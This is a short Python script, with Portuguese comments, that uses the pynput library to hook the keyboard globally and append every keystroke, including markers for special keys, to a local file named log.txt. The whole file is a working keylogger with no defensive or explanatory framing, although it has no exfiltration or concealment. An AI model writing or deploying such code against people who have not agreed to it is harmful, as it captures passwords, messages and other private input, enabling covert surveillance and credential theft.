from pynput import keyboard

ignorar = {
    keyboard.Key.shift, keyboard.Key.shift_r,
    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
    keyboard.Key.alt_l, keyboard.Key.alt_r,
    keyboard.Key.caps_lock, keyboard.Key.cmd
}

pressed_keys = set()  # controla teclas já processadas


def on_press(key):
    global pressed_keys
    if key in pressed_keys:
        return  # ignora se já foi processada

    try:
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
        pressed_keys.add(key)
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key == keyboard.Key.backspace:
                f.write(" [BKSP] ")
            elif key in ignorar:
                pass
            else:
                f.write(f"[{key}] ")
        pressed_keys.add(key)


def on_release(key):
    global pressed_keys
    pressed_keys.discard(key)  # remove do controle quando solta


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
